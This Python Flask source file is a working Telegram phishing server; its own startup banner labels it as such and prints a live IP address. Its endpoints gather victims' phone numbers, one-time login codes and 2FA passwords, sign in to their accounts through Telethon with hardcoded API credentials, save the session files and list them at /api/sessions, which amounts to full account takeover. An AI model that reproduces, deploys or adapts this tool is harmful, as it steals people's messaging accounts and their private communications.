from flask import Flask, request, jsonify, send_from_directory
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
from flask_cors import CORS
import asyncio
import os
import logging
import time

logging.basicConfig(level=logging.INFO)
app = Flask(__name__, static_folder='static')
CORS(app)

API_ID = 9348118
API_HASH = "b6e1802b599d8f4fb8716fcd912f20f2"

pending_authorizations = {}
sessions_dir = "sessions"

if not os.path.exists(sessions_dir):
    os.makedirs(sessions_dir)

def run_async(func, *args):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(func(*args))
        return result
    except Exception as e:
        logging.error(f"Async error: {e}")
        return {'status': 'error', 'message': str(e)}
    finally:
        loop.close()

async def create_telegram_session(phone, code=None, password=None):
    try:
        session_file = os.path.join(sessions_dir, f'session_{phone}')
        client = TelegramClient(session_file, API_ID, API_HASH)
        
        await client.connect()
        
        if await client.is_user_authorized():
            me = await client.get_me()
            logging.info(f"✅ Сессия уже существует: {phone}")
            await client.disconnect()
            return {
                'status': 'success', 
                'message': f'Сессия сохранена для {me.first_name}',
                'session_file': session_file
            }
        
        if not code and not password:
            try:
                sent_code = await client.send_code_request(phone)
                pending_authorizations[phone] = {
                    'phone_code_hash': sent_code.phone_code_hash,
                    'timestamp': time.time()
                }
                logging.info(f"📱 Код отправлен на: {phone}")
                return {'status': 'code_sent', 'message': 'Код отправлен в Telegram'}
            except FloodWaitError as e:
                wait_time = e.seconds
                return {'status': 'flood_wait', 'message': f'Подождите {wait_time} секунд'}
        
        elif code:
            if phone not in pending_authorizations:
                return {'status': 'error', 'message': 'Сначала запросите код'}
            
            phone_code_hash = pending_authorizations[phone]['phone_code_hash']
            
            try:
                await client.sign_in(
                    phone=phone, 
                    code=code, 
                    phone_code_hash=phone_code_hash
                )
                
                me = await client.get_me()
                logging.info(f"🔥 Сессия создана: {phone} ({me.first_name})")
                
                if phone in pending_authorizations:
                    del pending_authorizations[phone]
                
                await client.disconnect()
                
                return {
                    'status': 'success',
                    'message': f'Аккаунт {me.first_name} подключен',
                    'session_file': session_file
                }
                
            except SessionPasswordNeededError:
                pending_authorizations[phone]['client'] = client
                return {'status': 'password_required', 'message': 'Требуется пароль 2FA'}
            except PhoneCodeInvalidError:
                return {'status': 'error', 'message': 'Неверный код'}
                
        elif password:
            if phone not in pending_authorizations:
                return {'status': 'error', 'message': 'Сначала введите код'}
            
            try:
                await client.sign_in(password=password)
                me = await client.get_me()
                logging.info(f"🔐 Вход с паролем: {phone} ({me.first_name})")
                
                if phone in pending_authorizations:
                    del pending_authorizations[phone]
                
                await client.disconnect()
                
                return {
                    'status': 'success',
                    'message': f'Аккаунт {me.first_name} подключен',
                    'session_file': session_file
                }
            except Exception as e:
                return {'status': 'error', 'message': f'Ошибка пароля: {str(e)}'}
    
    except Exception as e:
        logging.error(f"❌ Ошибка: {e}")
        return {'status': 'error', 'message': str(e)}

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/static/<path:path>')
def static_files(path):
    return send_from_directory('static', path)

@app.route('/api/request-code', methods=['POST'])
def request_code():
    try:
        data = request.get_json()
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'status': 'error', 'message': 'Введите номер телефона'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logging.info(f"🎯 Запрос кода для: {phone}")
        result = run_async(create_telegram_session, phone)
        return jsonify(result)
        
    except Exception as e:
        logging.error(f"Ошибка: {e}")
        return jsonify({'status': 'error', 'message': 'Серверная ошибка'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.get_json()
        phone = data.get('phone', '').strip()
        code = data.get('code', '').strip()
        
        if not phone or not code:
            return jsonify({'status': 'error', 'message': 'Заполните все поля'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logging.info(f"🔐 Код для {phone}: {code}")
        result = run_async(create_telegram_session, phone, code)
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': 'Ошибка сервера'})

@app.route('/api/verify-password', methods=['POST'])
def verify_password():
    try:
        data = request.get_json()
        phone = data.get('phone', '').strip()
        password = data.get('password', '').strip()
        
        if not phone or not password:
            return jsonify({'status': 'error', 'message': 'Заполните все поля'})
        
        logging.info(f"🔑 Пароль для {phone}")
        result = run_async(create_telegram_session, phone, None, password)
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': 'Ошибка сервера'})

@app.route('/api/sessions')
def list_sessions():
    sessions = []
    if os.path.exists(sessions_dir):
        for file in os.listdir(sessions_dir):
            if file.startswith('session_'):
                sessions.append(file)
    return jsonify({'sessions': sessions})

if __name__ == '__main__':
    print("\n" + "="*50)
    print("🚀 TELEGRAM ФИШИНГ СЕРВЕР ЗАПУЩЕН!")
    print(f"📍 IP: 188.225.11.61:5000")
    print(f"📁 Сессии сохраняются в: {sessions_dir}")
    print("="*50 + "\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
